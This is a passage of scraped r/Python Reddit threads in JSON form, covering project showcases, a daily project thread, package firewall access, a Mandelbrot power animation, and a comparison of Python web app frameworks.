            "author": "orion_tvv",
            "score": "42",
            "content": "I think BFS (Breadth-first search) would be faster here (but it'll use more memory for queue) Anyway, would be nice to compare these visualizations with A*."
        },
        {
            "author": "tangerinelion",
            "score": "15",
            "content": "Typo in the output: length"
        },
        {
            "author": "BrawlinBawkah",
            "score": "6",
            "content": "Why does the oath turn green at one point? Cool little program!"
        },
        {
            "author": "prithvidiamond1",
            "score": "6",
            "content": "Just finished learning dijkstra's and A* and even implemented the code for it on my on made up shit maze, but I don't want to sit and write mazes so I am at the moment making a custom maze generator. Custom because, the mazes generated by DFS with recursive backtracking or randomized Kruskal or Prim's algs or even recursive division almost all look like the maze that I get in my daily newspaper for toddlers to solve. I making a maze that resembles a bunch of streets of Manhattan or something along those lines so, hopefully if some of you have some useful inputs for me, I would greatly appreciate that!"
        },
        {
            "author": "dirtflake",
            "score": "5",
            "content": "I love it, making me more interested in Coding."
        },
        {
            "author": "kartikgiri",
            "score": "4",
            "content": "Brute force and backtracking?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cke7cp",
    "post_score": "9",
    "post_time": "Sunday, May 5, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "vectorizer99",
            "score": "13",
            "content": "Not sure if it counts, and I'm a newbie to this subreddit, but ... starting to slowly read the Fluent Python book and work though the examples. I'm just an amateur coding in Python to build smallish (3-20kloc) programs to support my main hobby, and I'm tired of the feeling that I could be much more effective if I learned the language systematically instead of one Google search at a time."
        },
        {
            "author": "cmcclu5",
            "score": "9",
            "content": "Working on kicking out tutorials for the coding challenges I have gotten as a principal/senior engineer so that others can benefit from my terrible interview experiences."
        },
        {
            "author": "Gokdencircle",
            "score": "6",
            "content": "Working on a evolution sim, where each creature is an independent small neural network, sized 3/16/4. Mutation by random modding selected weights. Displaying the movements in a 3d world. Creatures are low poly 3d models. Thusly also working on a 3d projection engine. Predictable, at more than 80 creatures my modest desktop grinds to about 1 fps So sone optimisation to do (numba?) Anyway its just my hobby, huge fun."
        },
        {
            "author": "__shrubbery__",
            "score": "5",
            "content": "I just released qtile-bonsai yesterday! It's sort of an extension for the python-scriptable qtile tiling window manager , that lets you arrange your windows as splits, tabs and even sub-tabs.",
            "replies": [
                {
                    "author": "CopOnTheRun",
                    "score": "2",
                    "content": "Question, as someone else who's making a Linux based tool, how do you best distribute your package? I see you have listed pip install, but most modern versions of pip aren't letting users install a package without being in a virtual environment (for good reason). Then you have to explain what a virtual environment is and how to set it up. Oftentimes (for venv at least) then you have to make sure you've got the environment active and that all seems like a mess from a user perspective. I feel like the best way would be to get it into each ditro's repository but I'm barely familiar with packaging for Python and pip, let alone every Linux distro in existence.",
                    "replies": [
                        {
                            "author": "__shrubbery__",
                            "score": "2",
                            "content": "For a tool (like a CLI/GUI application), I reckon the fairly standard way of doing it nowadays is to install it via pipx, which automatically installs things into venvs behind the scenes. But it's made available in your shell and desktop-env just like any other application. eg. I have tools like httpie, ipython, etc installed this way. As a developer, you just have to make your package available in the usual way in PyPI. For my library here, it's a little tricky since it's not a tool, rather a library. And it's kind of an extension to a tool - qtile. (btw, I'd install qtile via `pipx` if it wasn't available in my linux package manager). Right now, I actually have to do pip install qtile-bonsai --break-system-packages so that the system level qtile package can see my library package (I should add this to the README). I have a TODO to publish it on other channels where qtile is available. I think `pipx` should have a way to have 2 packages share the same venv so they can see each other, but I haven't looked into it. Edit: Just saw that pipx has a pipx inject feature that allows the above :)"
                        }
                    ]
                }
            ]
        },
        {
            "author": "hawkedmd",
            "score": "3",
            "content": "Hi everyone, I just coded a chat application tailored for family use. Motivated by the high costs associated with the team version of ChatGPT, I sought an alternative that uses the cost-effective OpenRouter API and OpenAI's API services. The app features: Conversational Memory: For more natural discussions. PDFChat: To easily talk about content in PDF documents. Image Generation: For creating images from text prompts. It was a personal project to better connect with my family, but I thought it might be helpful to others seeking similar solutions. If you’re interested, you can check it out here: Family Chat on GitHub I’m really hoping it can be useful to someone else, and I’m open to any feedback or suggestions. Thanks for checking it out!"
        },
        {
            "author": "0xe5e",
            "score": "3",
            "content": "Built an AI weather forecasting tooling repo on top of large weather models. They are like LLMs in the sense that it has been really painful to run & experiment with them. Any feedback welcome!"
        },
        {
            "author": "Priest-Pucci",
            "score": "2",
            "content": "heyo, recently made a personal budget tracker in python using oop it calculates the total saving,total expenses and annual income of a person. However im snot able to calculate the or truly depict the result of annual income rest all are working fine."
        },
        {
            "author": "Zaloog1337",
            "score": "2",
            "content": "Currently working on a Terminal User Interface (TUI) build with the great Textual package for Rye the relatively new project/package manager. If you want to try it out already you can find more infos here (github)."
        },
        {
            "author": "sffjunkie",
            "score": "2",
            "content": "2 things, the first is only Python related, a set of Just Files to manage my Python projects https://github.com/sffjunkie/justfiles/ and the second a command line tool to manage `.gitignore` files"
        },
        {
            "author": "notanamber",
            "score": "2",
            "content": "I have created a command line tool that tries to put together the find command with the tree command by generating a tree with the search results. This is a screenshot to get an idea how it works: vifind It is written completely in python (with the standard libraries) under the GPL licence, any advice/contribution is appreciated. The repository with the documentation can be found here"
        },
        {
            "author": "desgeeko",
            "score": "2",
            "content": "Working on a PDF library: https://github.com/desgeeko/pdfsyntax"
        },
        {
            "author": "printr_head",
            "score": "2",
            "content": "I'm working on a novel class of GA. When I say novel I mean it. no one has anything like this. Im still refining it and building up the frame work for easy testing and deployment. Right now its capable of transfer learning and incremental learning between runs. The framework is designed to work with discrete genes. just define the fitness class and the gene set and go. still refining things and fully understanding how the innerworkings play together. Working on getting everything set for a patent application."
        },
        {
            "author": "Kish010",
            "score": "2",
            "content": "Not sure if it counts but I'm working on using visualization llibraries in python to create an interactive visual of the the globe where each country can be clicked on to see FIfa20 players who are in the game and from that country."
        },
        {
            "author": "L4g4d0",
            "score": "1",
            "content": "A memecoin sniper bot (on Solana); hopefully I can buy a lambo soon /s"
        },
        {
            "author": "bb-wa",
            "score": "1",
            "content": "I'm trying to make a program with a timer, stopwatch and date calculator"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "trying to roll out some platform improvements: logging, upgrading python versions across different projects, adding type hinting to all our systems and improving the database access layer/code - lots of generic type hinting (everything is a dict)"
        },
        {
            "author": "Financial-Ad7755",
            "score": "1",
            "content": "I am still trying to figure things out because i am new to programming,"
        },
        {
            "author": "doudou8310",
            "score": "1",
            "content": "In an ideal world, I would have an automatic web-form filling tool that could do the job in 0-2 seconds to get very highly coveted / very hard to get tickets... From researching a possible bot to do this today, it seems Python might be the right language to do that. the issue is that I know absolutely jack-shit about Python... Anyone here knowledgeable about something like this? PM me if so"
        }
    ]
},
{
    "post_author": "gings7",
    "post_id": "1cj2ztk",
    "post_score": "20",
    "post_time": "Friday, May 3, 2024 at 10:45:57 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "typedattr: Autocompletion and typechecking for CLI script arguments, using standard argparse syntax",
    "media": [
        "https://github.com/simon-ging/typedparser"
    ],
    "post_content": "Excited to share my pypi package typedparser I have been working on for around 1 year now.\nWhat My Project Does: It enables writing CLI scripts and create an \"args\" variable with autocompleted members and type checks, but still keeps the simple and universally understood syntax of the stdlib argarse module.\nTarget Audience: For stability, I battletested it in my research projects and added automatic builds as well as 80%+ test coverage. So I believe it is pretty stable.\nComparison: For typing functionality it uses the attrs package as backend. It also provides some additional features for object and dictionary manipulation. Of course there are many other CLI argument packages out there, but this one stands out in that it tries to keep the syntax of the argparse standard library as much as possible, making it easy for others to figure out what your script does. Check it out and let me know what you think.",
    "comments": [
        {
            "author": "Ducksual",
            "score": "3",
            "content": "In general if you're depending on a PyPI package directly in your code, you should declare it in your requirements to guarantee that it's installed and not rely on it being installed by another dependency. At the moment for Python 3.7 you're relying on the fact that attrs depends on importlib-metadata which depends on typing_extensions in order for typing_extensions to be in place for _typedattr.py. It's unlikely in this specific case (I'd expect 3.7 support to be dropped first) but if there was an attrs update that removed the dependency on importlib-metadata your module would no longer work on Python 3.7 when someone installed it. (Note that this probably wouldn't show up in your tests, because installing pytest on 3.7 also installs typing_extensions and would only show up when someone used it without either of these modules.)",
            "replies": [
                {
                    "author": "gings7",
                    "score": "1",
                    "content": "Good point. I updated the requirements.txt to require those packages explicitly. attrs importlib_metadata;python_version<'3.8' typing_extensions;python_version<'3.8'"
                }
            ]
        },
        {
            "author": "leynosncs",
            "score": "2",
            "content": "I really like the approach you've taken here. It builds on familiarity with two commonly used Python libraries. I was thinking about adding environment variable support. Perhaps with a second decorator as described in https://www.attrs.org/en/stable/extending.html @read_env(prefix=\"FOOBAR\") @define class Args: # omit the argument name to have it inferred from the field name foo: str = add_argument(positional=True) bar: int = add_argument(shortcut=\"-b\", type=int, default=0) opt: Optional[str] = add_argument() Then values would be read from FOOBAR_FOO, FOOBAR_BAR, and FOOBAR_OPT, with explicit commandline args taking preference over env variables. Is this something you would be interested in as a contribution?",
            "replies": [
                {
                    "author": "gings7",
                    "score": "2",
                    "content": "Happy you like it. Your idea sounds interesting, but you would have to solve some edge cases, as here: foo is positional so it's required and the env var will never be used. bar has a default value, that would overwrite the env as well. I would probably just do default=int(os.environ.get(\"FOOBAR_BAR\", 0)) but if you use env vars alot your contribution might be very useful. So in short, yes, you are welcome to contribute."
                }
            ]
        },
        {
            "author": "PsychologicalFactor1",
            "score": "1",
            "content": "I think is overkill to use numpy",
            "replies": [
                {
                    "author": "gings7",
                    "score": "3",
                    "content": "good point. i made the numpy support optional."
                }
            ]
        },
        {
            "author": "hotplasmatits",
            "score": "1",
            "content": "I'll try to look into it, but it's going to take a lot to get me to give up fire."
        }
    ]
},
{
    "post_author": "BullCityPicker",
    "post_id": "1cmdfvy",
    "post_score": "12",
    "post_time": "Tuesday, May 7, 2024 at 5:36:54 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "List of Sites that Packages Need to Connect to?",
    "media": [],
    "post_content": "I'm doing most of my work behind a government firewall, and I'm having trouble connecting to certain sites. I can do the usual \"pip\" installs just fine, but I'm talking about packages that need to download data to do their job. An example is the NLTK (Natural Language Toolkit) package, which downloads dictionaries, lookup tables for sentiment analysis, and so on. I know what sites to open up for that particular problem (pastebin.com and nltk.org), but I wonder if anybody's made a list of such sites for different packages.\nI can ask for the two sites I know about to be opened up, but I'd like to have a more comprehensive list so I don't have to go through the red tape multiple times.",
    "comments": [
        {
            "author": "ResearchNo9485",
            "score": "13",
            "content": "You can look at the source code on Github, separately download those datasets, then transfer them to yourself with DoD safe https://safe.apps.mil Good luck; the government constantly chooses to fail here when the bar is in hell.",
            "replies": [
                {
                    "author": "BullCityPicker",
                    "score": "1",
                    "content": "Looking at this, that site is basically like 'pastebin.com' for the government, then? This is intriguing. I haven't seen it yet. I do have a \"secure\" USB drive that's gov't approved that I use, but this looks like a more secure and approved way of moving files between locations that would otherwise be prevented or gray-area."
                },
                {
                    "author": "v_a_n_d_e_l_a_y",
                    "score": "0",
                    "content": "Weird assumption that he works for the US government. And federal government.And is DoD safe universal for all of US federal government even?",
                    "replies": [
                        {
                            "author": "ResearchNo9485",
                            "score": "3",
                            "content": "Not a weird assumption. He may not be DoD, but the US gov's security posture forces devs to ask questions like this. I haven't seen these issues coming out of other western governments so they've either solved the problem or they aren't doing the work.",
                            "replies": [
                                {
                                    "author": "v_a_n_d_e_l_a_y",
                                    "score": "0",
                                    "content": "I work for the Canadian government. I know people who work for other Western governments. The \"offline resources for packages\" is pretty universal."
                                }
                            ]
                        },
                        {
                            "author": "BullCityPicker",
                            "score": "1",
                            "content": "I did say I was 'behind a gov't firewall', so it's not an assumption. I do in fact work for the government, so security regulations do apply, but I work for an agency that has sort of a \"trusted\" security level, not a literal \"secret\", let alone \"top secret\" level, if that makes sense.",
                            "replies": [
                                {
                                    "author": "v_a_n_d_e_l_a_y",
                                    "score": "1",
                                    "content": "You said government. You did not specify which country or which level of government. So it certainly is an assumption to go from \"government\" to \"US federal government\""
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "SheriffRoscoe",
            "score": "3",
            "content": "If you're gonna whitelist pastebin.com, you might as well shut the firewall down."
        },
        {
            "author": "v_a_n_d_e_l_a_y",
            "score": "1",
            "content": "Unfortunately it's not easy especially generically. If you are doing data science (nltk suggests so) then a big one would be hugging face for models. And GitHub itself as many places host their models there. And then places like pytorch model zoo (and keras/tensorflow equivalent). I would say most packages not hosting ML models tend not to have external data though. You'll also run into issues we JavaScript if you're doing plotting/mapping as those tend to hit the web. Bokeh, plotly etc"
        }
    ]
},
{
    "post_author": "yousefabuz",
    "post_id": "1ci4zd5",
    "post_score": "2",
    "post_time": "Thursday, May 2, 2024 at 5:52:22 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PkgInspect - Inspect Local/External Python Packages",
    "media": [
        "https://github.com/yousefabuz17/PkgInspect"
    ],
    "post_content": "GitHub\nWhat My Project Does\nPkgInspect is a comprehensive tool designed to inspect and compare Python packages and Python versions effortlessly. It equips users with a comprehensive set of tools and utility classes to retrieve essential information from installed Python packages, compare versions seamlessly, and extract various details about Python installations with ease.\nTarget Audience\nDevelopers and Python enthusiasts looking to streamline the process of inspecting Python packages, comparing versions, and extracting vital information from Python installations will find PkgInspect invaluable. Many current modules such as importlib_metadata and pkg_resources are fairly limited on what items can be inspected and retrieved for a specified python package. Also noticed pkg_resources has also deprecated some of its important retrieval methods.\nComparison\nPkgInspect stands out from other Python package inspection tools due to its robust features. Unlike traditional methods that require manual inspection and comparison, PkgInspect automates the process, saving developers valuable time and effort. With PkgInspect, you can effortlessly retrieve package information, compare versions across different Python installations, and extract crucial details with just a few simple commands.\nKey Features\nInspect Packages: Retrieve comprehensive information about installed Python packages.\nCompare Versions: Seamlessly compare package data across different Python versions.\nRetrieve Installed Pythons: Identify and list installed Python versions effortlessly.\nInspect PyPI Packages: Gather detailed information about packages from the Python Package Index (PyPI).\nFetch Available Updates: Stay up-to-date with available updates for a package from the current version.\nList Inspection Fieldnames: Access a list of available fieldnames for package inspection.\nRetrieve Package Metrics: Extract OS statistics about a package effortlessly.\nFetch GitHub Statistics: Retrieve insightful statistics about a package from GitHub effortlessly.\nRetrieve all Python Packages: Easily list all installed Python packages for a given Python version.\nMain Components\nCore Modules\nPkgInspect: Inspects Python packages and retrieves package information.\nPkgVersions: Retrieves and compares package data across different Python versions.\nPkgMetrics: Extracts OS statistics about a package.\nFunctions\ninspect_package: Inspects a Python package and retrieves package information.\ninspect_pypi: Inspects a package from the Python Package Index (PyPI).\nget_available_updates: Fetches available updates for a package from the current version.\nget_installed_pythons: Identifies and lists installed Python versions.\nget_version_packages: Lists all installed Python packages for a given Python version.\npkg_version_compare: Compares package data across different Python versions.\nInspection Field Options\nAny other field name will be treated as a file name to inspect from the packages' site-path directory.\n- `short_meta` (dict[str, Any]): Returns a dictionary of the most important metadata fields.\n    - If only one field is needed, you can use any of the following metadata fields.\n    - Possible Fields instead of `short_meta`:\n        - `Metadata-Version` (PackageVersion)\n        - `Name` (str)\n        - `Summary` (str)\n        - `Author-email` (str)\n        - `Home-page` (str)\n        - `Download-URL` (str)\n        - `Platform(s)` (set)\n        - `Author` (str)\n        - `Classifier(s)` (set)\n        - `Description-Content-Type` (str)\n- `short_license` (str): Returns the name of the license being used.\n- `metadata` (str): Returns the contents of the METADATA file.\n- `installer` (str): Returns the installer tool used for installation.\n- `license` (str): Returns the contents of the LICENSE file.\n- `record` (str): Returns the list of installed files.\n- `wheel` (str): Returns information about the Wheel distribution format.\n- `requested` (str): Returns information about the requested installation.\n- `authors` (str): Returns the contents of the AUTHORS.md file.\n- `entry_points` (str): Returns the contents of the entry_points.txt file.\n- `top_level` (str): Returns the contents of the top_level.txt file.\n- `source_file` (str): Returns the source file path for the specified package.\n- `source_code` (str): Returns the source code contents for the specified package.\n- `doc` (str): Returns the documentation for the specified package.\n\n- `Pkg` Custom Class Fields\n    - `PkgInspect fields`: Possible Fields from the `PkgInspect` class.\n        - `site_path` (Path): Returns the site path of the package.\n        - `package_paths` (Iterable[Path]): Returns the package paths of the package.\n        - `package_versions` (Generator[tuple[str, tuple[tuple[Any, str]]]]): Returns the package versions of the package.\n        - `pyversions` (tuple[Path]): Returns the Python versions of the package.\n        - `installed_pythons` (TupleOfPkgVersions): Returns the installed Python versions of the package.\n        - `site_packages` (Iterable[str]): Returns the site packages of the package.\n        - `islatest_version` (bool): Returns True if the package is the latest version.\n        - `isinstalled_version` (bool): Returns True if the package is the installed version.\n        - `installed_version` (PackageVersion): Returns the installed version of the package.\n        - `available_updates` (TupleOfPkgVersions): Returns the available updates of the package.\n\n    - `PkgVersions fields`: Possible Fields from the `PkgVersions` class.\n        - `initial_version` (PackageVersion): Returns the initial version of the package.\n        - `installed_version` (PackageVersion): Returns the installed version of the package.\n        - `latest_version` (PackageVersion): Returns the latest version of the package.\n        - `total_versions` (int): Returns the total number of versions of the package.\n        - `version_history` (TupleOfPkgVersions): Returns the version history of the specified package.\n        - `package_url`: Returns the URL of the package on PyPI.\n        - `github_stats_url` (str): Returns the GitHub statistics URL of the package.\n        - `github_stats` (dict[str, Any]): Returns the GitHub statistics of the package.\n            - The GitHub statistics are returned as a dictionary \\\n                containing the following fields which can accessed using the `item` parameter:\n                - `Forks` (int): Returns the number of forks on GitHub.\n                - `Stars` (int): Returns the number of stars on GitHub.\n                - `Watchers` (int): Returns the number of watchers on GitHub.\n                - `Contributors` (int): Returns the number of contributors on GitHub.\n                - `Dependencies` (int): Returns the number of dependencies on GitHub.\n                - `Dependent repositories` (int): Returns the number of dependent repositories on GitHub.\n                - `Dependent packages` (int): Returns the number of dependent packages on GitHub.\n                - `Repository size` (NamedTuple): Returns the size of the repository on GitHub.\n                - `SourceRank` (int): Returns the SourceRank of the package on GitHub.\n                - `Total releases` (int): Returns the total number of releases on GitHub.\n    \n    - `PkgMetrics fields`: Possible Fields from the `PkgMetrics` class.\n        - `all_metric_stats` (dict[str, Any]): Returns all the OS statistics of the package.\n        - `total_size` (int): Returns the total size of the package.\n        - `date_installed` (datetime): Returns the date the package was installed.\n\n- `pypistats fields`: Possible Fields from the `pypistats` module.\n    - `all-pypi-stats` (dict[str, Any]): Returns all the statistics of the package on PyPI into a single dictionary.\n    - `stats-overall` (dict[str, Any]): Returns the overall statistics of the package on PyPI.\n    - `stats-major` (dict[str, Any]): Returns the major version statistics of the package on PyPI.\n    - `stats-minor` (dict[str, Any]): Returns the minor version statistics of the package on PyPI.\n    - `stats-recent` (dict[str, Any]): Returns the recent statistics of the package on PyPI.\n    - `stats-system` (dict[str, Any]): Returns the system statistics of the package on PyPI.\nDownsides & Limitations\nMy algorithms are fairly well but do come with some important downsides.\nPkgInspect will ONLY inspect packages that are python files or contains a dist-info folder in the site-packages folder for a given Python version. Was not able to efficiently figure out a way to retrieve all necessary packages without containing unrelevant folders/files. Some personal packages may be skipped otherwise.\nBeta (pre-releases) has not been implemented yet.\nAs many files may be handled, the runtime may be slow for some users.\nThe demand for a project like this is not so much in-demand but have noticed many people, including my self, still seeking for a project like this. However, this type of project does seem to exceed my experience level with Python and algorithms (hence the downsides) so not entirely sure how far this project may come in the future. Was hoping for it to be GUI based if possible.\nUsage Examples\nfrom pkg_inspect import inspect_package\n\ninspect_package(\"pkg_inspect\", itemOrfile=\"initial_version\")\n# Output (Format - DateTimeAndVersion):\n('May 02, 2024', '0.1.0')\n\n\ninspect_package(\"pkg_inspect\", itemOrfile=\"version_history\")\n# Output (Format - tuple[DateTimeAndVersion]):\n(('May 02, 2024', '0.1.2'), ('May 02, 2024', '0.1.1'), ('May 02, 2024', '0.1.0'))\n\n\ninspect_package(\"pkg_inspect\", pyversion=\"3.12\", itemOrfile=\"short_meta\")\n# Output (Format dict[str, Any]):\n{'Author': 'Yousef Abuzahrieh',\n 'Author-email': 'yousefzahrieh17@gmail.com',\n 'Classifiers': {'Development Status 4 Beta',\n                 'Intended Audience Developers',\n                 'License OSI Approved Apache Software License',\n                 'Operating System OS Independent',\n                 'Programming Language Python 3',\n                 'Programming Language Python 3 Only',\n                 'Topic Utilities'},\n 'Description-Content-Type': 'text/markdown',\n 'Download-URL': 'https://github.com/yousefabuz17/PkgInspect.git',\n 'Home-page': 'https://github.com/yousefabuz17/PkgInspect',\n 'License': 'Apache Software License',\n 'Metadata-Version': <Version('2.1')>,\n 'Name': 'pkg-inspect',\n 'Platforms': {'Windows', 'MacOS', 'Linux'},\n 'Summary': 'A comprehensive tools to inspect Python packages and Python '\n            'installations.'}\n\n\ninspect_package(\"pandas\", pyversion=\"3.12\", itemOrfile=\"github_stats\")\n# Output (Format - dict[str, Any]):\n{'Contributors': '1.09K',\n 'Dependencies': 3,\n 'Dependent packages': '41.3K',\n 'Dependent repositories': '38.4K',\n 'Forks': '17.3K',\n 'Repository size': Stats(symbolic='338.000 KB (Kilobytes)', calculated_size=338.0, bytes_size=346112.0),\n 'SourceRank': 32,\n 'Stars': '41.9K',\n 'Total releases': 126,\n 'Watchers': 1116}",
    "comments": []
},
{
    "post_author": "Swipecat",
    "post_id": "g1xlte",
    "post_score": "2099",
    "post_time": "Wednesday, April 15, 2020 at 9:23:51 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I found what happens when you change the Mandelbrot Set's power value and animated it with Python",
    "media": [
        "https://preview.redd.it/u2r68zcwx0t41.gif?width=640&crop=smart&format=png8&s=a7114798858a7ca88af7ec318ef9ab6b6e655f0f"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "kat029",
            "score": "184",
            "content": "huh..... so that's how you get a Reese's peanut butter cup....",
            "replies": [
                {
                    "author": "WhoKilledTheMoose",
                    "score": "36",
                    "content": "Not sorry. Reese's."
                }
            ]
        },
        {
            "author": "Swipecat",
            "score": "93",
            "content": "The usual Mandelbrot Set has the formula Z ↦ Z2 + C so having generated the Mandelbrot Set when I was learning Python a while back, I tried putting in power values other than 2 to see what happens. The result was interesting. I later found that this was already known about, and had a name. Powers greater than 2 are called \"Multibrots\". I've now tidied up my code and made it much faster with Numpy. It uses Pillow to save a sequence of gif images, then calls the \"gifsicle\" command line app to assemble it. This animated gif is the result. Code on Github. Pyhon library installation notes.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Yes, sorry it's not very readable. The various formulae for controlling the pace of animation and maintaining contrast as the animation proceeded ended up far more complex than the Mandelbrot formula itself. I've added a few comments to say roughly what each line does but documenting it properly would be big task.",
                    "replies": [
                        {
                            "author": "Swipecat",
                            "score": "17",
                            "content": "Yes, sorry it's not very readable. The various formulae for controlling the pace of animation and maintaining contrast as the animation proceeded ended up far more complex than the Mandelbrot formula itself. I've added a few comments to say roughly what each line does but documenting it properly would be big task."
                        },
                        {
                            "author": "WiggleBooks",
                            "score": "7",
                            "content": "Part of it is the underlying complexity in the simplicity of the recursive formula itself!! That small little equation, while straightforward to code in Python, automatically comes with it so much hidden structure."
                        },
                        {
                            "author": "cecilkorik",
                            "score": "4",
                            "content": "Fractals are wild. They're definitely some of the coolest art to come out of math, but they're mathematically fascinating too."
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "Math!!"
                        }
                    ]
                },
                {
                    "author": "Tweak_Imp",
                    "score": "4",
                    "content": "Now go down from 2"
                },
                {
                    "author": "draeath",
                    "score": "2",
                    "content": "Seems to me a power approaching infinity produces a circle. Interesting."
                }
            ]
        },
        {
            "author": "ChaosCon",
            "score": "38",
            "content": "If I may offer some advice, if you find yourself doing this its = np.zeros_like(c.real)             # iteration count it's a really good sign that you should just rename its to iteration_count.",
            "replies": [
                {
                    "author": "Swipecat",
                    "score": "22",
                    "content": "In my defence, I don't normally use variable names that short. Not these days anyway. But I ended up using old-school fortran-like single letters in much of this script to stop the size of some of the formulae exploding."
                }
            ]
        }
    ]
},
{
    "post_author": "Sea_Split_1182",
    "post_id": "1citedj",
    "post_score": "42",
    "post_time": "Friday, May 3, 2024 at 1:56:11 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Dash vs Reflex vs Others",
    "media": [
        "https://anvil.works/",
        "https://panel.holoviz.org/",
        "https://gradio.app/",
        "https://reflex.dev/",
        "https://streamlit.io/",
        "https://dash.plotly.com/"
    ],
    "post_content": "Where can I find a decent comparison (pros and cons) of these 5 solutions? They seem to be solving the same problem, which is, afaiu, separating the frontend ‘annoyance’ from Python scripting / math.\n⁠Reflex (used to be called Pynecone) https://reflex.dev\n⁠Streamlit https://streamlit.io\n⁠Gradio https://gradio.app\n⁠Dash https://dash.plotly.com\n⁠Panel https://panel.holoviz.org/\n⁠Anvil https://anvil.works/\nQuarto\nMy use case: user access the web app, choose some parameters, selects things that go or not into a model. Python returns results of my math. Needs to be somewhat eye-candy and I need to use a lot of pictures to get the user input (i.e. “which of these figures you like most? 1,2,3. User clicks on “3”, 3 is considered in the model.",
    "comments": [
        {
            "author": "AlpacaDC",
            "score": "17",
            "content": "I love dash. Currently using for building a MVP at work. It’s basically Flask with react on top of it, so I use Jinja templates for simple pages and Dash for the actual webapp. Streamlit is more for prototyping and smaller/simpler projects or tools. Can’t speak for the others frameworks as I haven’t used them, but Dash would fit very nicely with your use case.",
            "replies": [
                {
                    "author": "Sea_Split_1182",
                    "score": "2",
                    "content": "Thanks Alpaca. Where would I get the “Jinja templates” to try this out ?",
                    "replies": [
                        {
                            "author": "rowanobrian",
                            "score": "1",
                            "content": "I worked on dash for about a month last year. It was a pain whenever I needed any element which wasn't in dash standard library. It required JS/react knowledge, which I unfortunately didnt have. If you/colleague has that, it should be a breeze."
                        }
                    ]
                },
                {
                    "author": "Hot-Abbreviations475",
                    "score": "2",
                    "content": "Yeah I’ve been messing around with Dash recently too, it’s great."
                }
            ]
        },
        {
            "author": "Healthierpoet",
            "score": "26",
            "content": "nicegui",
            "replies": [
                {
                    "author": "Kryt0s",
                    "score": "4",
                    "content": "That and https://flet.dev are always my two go-to's."
                }
            ]
        },
        {
            "author": "Dashtikazar",
            "score": "7",
            "content": "Quarto is different from the other on your list. It isn't an app but a publishing framework. If I'm not mistaken, no server/ui so you'll get less possibilities, but on the other hand it allows to create self-contained .html (among other formats) that may be easier to share if you're not in a logic of hosting an app. Plus, it is multi-language (Python, R, Julia)"
        },
        {
            "author": "thicket",
            "score": "5",
            "content": "Can't help you with a comparison, but I've been working on a work project in Reflex and I like it pretty well so far. I can write front end code in Python, which is nice, but I also don't have to maintain an API between server/client- that all happens automagically. I'm skeptical of magic stuff in general, and the `State` abstraction that maintains state between server & client is a little inscrutable, BUT it's saving me a bunch of extra maintenance and build work that I'd have to do otherwise. I'm here for it."
        },
        {
            "author": "mr_claw",
            "score": "3",
            "content": "PyWebIO & Nicegui will fit your needs."
        },
        {
            "author": "Hot-Abbreviations475",
            "score": "3",
            "content": "I don’t know about the others, but this can certainly be done in Dash. some inspo"
        },
        {
            "author": "tecedu",
            "score": "3",
            "content": "We use Dash for multiple producuction apps, it does all that you want in the post."
        },
        {
            "author": "mangecoeur",
            "score": "2",
            "content": "Adding solara.dev to the mix. My favourite when you start work in jupyter notebooks and want to go towards building full apps."
        },
        {
            "author": "crawl_dht",
            "score": "2",
            "content": "Check out illa-builder",
            "replies": [
                {
                    "author": "Sea_Split_1182",
                    "score": "1",
                    "content": "This looks promising ! Thanks crawl"
                }
            ]
        },
        {
            "author": "I_will_delete_myself",
            "score": "2",
            "content": "Those are mostly for rough drafts and internal company projects for now. Also look into pyscript. If they can increase the speed of the library, then you got yourself the golden goose egg for what you need. You use normal web dev tools and able to insert a dash of python where you need it. Only issue is C compiled libraries, which I wouldn't be surprised if this is a issue elsewhere.",
            "replies": [
                {
                    "author": "Sea_Split_1182",
                    "score": "1",
                    "content": "Many thanks for this, @Iwill. Not sure I fully grasp the proposal of pyscript but I am reading the docs. Wanted to see a full big project using the tool but haven’t found it yet. Thanks"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cmqqgn",
    "post_score": "2",
    "post_time": "Wednesday, May 8, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "UnemployedTechie2021",
            "score": "3",
            "content": "I want to relearn Python because I have been searching for an opportunity for a while now but am not getting any. This has jolted the pillars of my confidence because I am not a beginner. I have around 20 years of work experience, I have worked with a Big 4 for 10 years some of which were as a Manager of a DataViz team. I have been learning coding since the time of MS Dos and have been a Teaching Assistant for a Deep Learning course. I understand that r/Python won't be able to help me gain my confidence, that's not the purpose of this sub. However, I personally feel that if I relearn Python I would be able to gain back some of the lost confidence. So I am asking for your feedback and help. - If I were to relearn Python, will CS50 be a good idea? - Is this the correct URL for CS50? https://cs50.harvard.edu/x/2024/ - I see that CS50 has other topics like C, SQL etc other than Python. However, I do not see pointers which is making me rethink about CS50. Will CS50 cover majority of the important topics for Python, or will it omit important topics like pointers for C in Python too? - Can somebody suggest a note taking method why I can apply to keep notes from this course which will not only help me in future but others too since I plan to make my progress etc open-source. Any help would be highly appreciated. Thanks in advance.",
            "replies": [
                {
                    "author": "niehle",
                    "score": "2",
                    "content": "Why not https://cs50.harvard.edu/python/2022/ ? You can also use https://programming-24.mooc.fi/ - whatever course fits you best. You should choose a note taking app which works for you since it is far from guaranteed other people are interested in your notes, even if they are open source."
                }
            ]
        },
        {
            "author": "rittler67",
            "score": "1",
